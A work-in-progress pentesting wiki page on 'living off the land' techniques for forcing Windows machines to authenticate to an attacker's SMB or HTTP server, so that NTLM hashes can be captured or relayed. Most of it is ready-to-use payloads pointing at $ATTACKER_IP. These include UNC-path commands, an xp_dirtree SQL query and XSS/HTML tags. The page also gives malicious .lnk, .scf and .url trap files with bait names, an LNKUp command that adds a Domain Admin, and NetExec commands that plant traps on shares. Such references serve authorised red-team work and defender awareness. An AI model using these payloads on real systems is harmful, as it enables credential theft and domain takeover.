# 🛠️ Living off the land

{% hint style="danger" %}
**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
{% endhint %}

## Theory

> In the physical world, “living off the land” simply means to survive only by the resources that you can harvest from the natural land. There may be multiple reasons for doing this — perhaps you want to get “off the grid,” or maybe you have something or someone to hide from. Or maybe you just like the challenge of being self-sufficient.
>
> In the technology world, “living off the land” (LotL) refers to attacker behavior that uses tools or features that already exist in the target environment. ([source](https://logrhythm.com/blog/what-are-living-off-the-land-attacks/))

There are multiple "living off the land" techniques that can be used to force authentications, to capture hashes, or to relay authentications. In order to use those techniques, testers need to have an initial access to "the land", i.e. the tools or features the technique uses.

## Practice

Those techniques will usually generate outgoing traffic on SMB or HTTP, hence requiring the attacker to set up an SMB or HTTP server to [capture](../ntlm/capture.md) or [relay](../ntlm/relay.md) the authentication (e.g. using tools like [Responder](https://github.com/SpiderLabs/Responder) (Python), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (Powershell), [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) or [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell)).

### Command execution

On Windows machines, cmdlets like `net` or `dir` can be used to make the machine access a remote resource, hence making it authenticate. This leads to an outgoing traffic using SMB.

```bash
dir \\$ATTACKER_IP\something
net use \\$ATTACKER_IP\something
```

The rpcping command can also be used to trigger an authentication. The perk of this technique is that the auth won't carry a signing negotiation flag, hence allowing for relays

### MS-SQL queries execution

On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remote SMB share. This leads to an outgoing traffic using SMB.

```bash
EXEC master.sys.xp_dirtree '\\$ATTACKER_IP\something',1,1
```

### File explorer

On Windows machines, the file explorer can be used to access remote resources like SMB shares by supplying its UNC path (i.e. `\\$ATTACKER_IP\something`) in the research bar. This leads to an outgoing traffic using SMB.

### Internet browser

Internet browsers can access HTTP servers by supplying their URL (i.e. `http://$IP:$PORT/something`) in the research bar. This technique is rarely used as it can pop up a prompt. This leads to an outgoing traffic using HTTP.

### HTML documents / XSS

HTML documents can be crafted (or injected with content when successfully exploiting an HTML injection attack such as an [Cross-Site Scripting](../../../web-services/inputs/xss.md)) in way that could make browsers authenticate when accessing a remote resource. This leads to an outgoing traffic using SMB.

```markup
<script>
    language='javascript' src="\\$ATTACKER_IP\something\something.js"
</script>
```

```markup
<img src="file://$ATTACKER_IP/something/something.png"/>
```

### Web server file inclusion

{% embed url="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" %}

### Windows Defender Remote Scanning

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\$ATTACKER_IP\file.txt
```

### Certutil

```bash
certutil.exe -syncwithWU  \\$ATTACKER_IP\share
```

### Trend Micro Remote Scanning

```bash
C:\Program Files (x86)\Trend Micro\OfficeScan Clien\PccNt.exe \\$ATTACKER_IP\s\
```

### Shortcut files (scf, lnk, url)

SMB shares can be trapped with shortcut files that will automatically be handled by Windows' file explorer (e.g. a URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary). This leads to an outgoing traffic using SMB.

{% hint style="info" %}
Shares an account has WRITE privileges over can be mapped with [smbmap](https://github.com/ShawnDEvans/smbmap) (Python).

```bash
smbmap -d "domain" -u "user" -p "password" --host-file targets.txt
```
{% endhint %}

{% hint style="info" %}
Shortcut file names can be preprended with a `@` symbol to put them on top of the share, to make sure the file explorer has to parse it.
{% endhint %}

{% hint style="success" %}
The [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft) (Python) tool can be used to generate multiple file types at once (lnk, scf, url, docx, xslx, htm, xml, pdf, ...).

```bash
ntlm_theft.py --generate all --server $ATTACKER_IP --filename "@FILENAME"
```
{% endhint %}

{% tabs %}
{% tab title=".lnk" %}
An LNK shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.

> Shortcuts with the .lnk extension have a lot of beneficial properties when it comes to stealth; [they are an exception](https://en.wikipedia.org/wiki/Shortcut\_\(computing\)#Microsoft\_Windows) from the Windows setting to show or hide file extensions. Even when “hide known file extensions” is disabled, explorer.exe will only show the name, allowing us to let it end in “.jpeg”. A major downside is that they only allow 1024 characters for the whole command they execute. ([source](https://hatching.io/blog/lnk-hta-polyglot/))

[LNKUp](https://github.com/Plazmaz/LNKUp) (Python) is a great tool to generate malicious LNK shortcuts. They can be set with a remote icon file to generate outgoing SMB traffic and authentications but can also be set to execute commands when opened (i.e. double-clicked).

```bash
# Simple SMB trap with remote icon file
LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk'

# SMB trap + command execution
LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' Pentester01 /domain /add"
```

```bash
# Simple SMB trap with remote icon file (Powershell)
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Windows\temp\@Salaries-2023.lnk")
$lnk.TargetPath = "\\<attackerIP>\@icon.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Salaries-2023."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

{% hint style="info" %}
**Advanced traps**

* LNK files can be mixed with some VBA: [Pwned by Shortcut](https://medium.com/secjuice/pwned-by-a-shortcut-b21473970944)
* LNK files can be mixed with some HTA: [LNK HTA Polyglot](https://hatching.io/blog/lnk-hta-polyglot/)
{% endhint %}

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to automatically push LNK files to a writeable share.

```bash
# Creation & upload
nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP"

# Cleanup
nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP" CLEANUP=True
```
{% endtab %}

{% tab title=".scf" %}
An SCF shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.

{% code title="@CONFIDENTIAL-ACCOUNTS.scf" %}
```bash
[Shell]
Command=2
IconFile=\\$ATTACKER_IP\something\something.ico
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}
{% endtab %}

{% tab title=".url" %}
A URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.

{% code title="@CONFIDENTIAL-ACCOUNTS.url" %}
```bash
[InternetShortcut]
URL=https://www.thehacker.recipes/
IconIndex=0
IconFile=\\$ATTACKER_IP\something\something.ico
```
{% endcode %}
{% endtab %}
{% endtabs %}

### PDF documents

[https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)

[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF)

### RTF documents

### MS Word documents

### Lock screen wallpaper

{% embed url="https://github.com/nccgroup/Change-Lockscreen" %}

{% embed url="https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation" %}

## Resources

{% embed url="https://hatching.io/blog/lnk-hta-polyglot/" %}

{% embed url="https://logrhythm.com/blog/what-are-living-off-the-land-attacks/" %}

{% embed url="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" %}

{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}

[https://github.com/Gl3bGl4z/All\_NTLM\_leak](https://github.com/Gl3bGl4z/All\_NTLM\_leak)

[https://mgp25.com/research/infosec/Leaking-NTLM-hashes/](https://mgp25.com/research/infosec/Leaking-NTLM-hashes/)

[https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office)

[https://www.ired.team/offensive-security/initial-access](https://www.ired.team/offensive-security/initial-access)

[https://github.com/mdsecactivebreach/Farmer](https://github.com/mdsecactivebreach/Farmer)
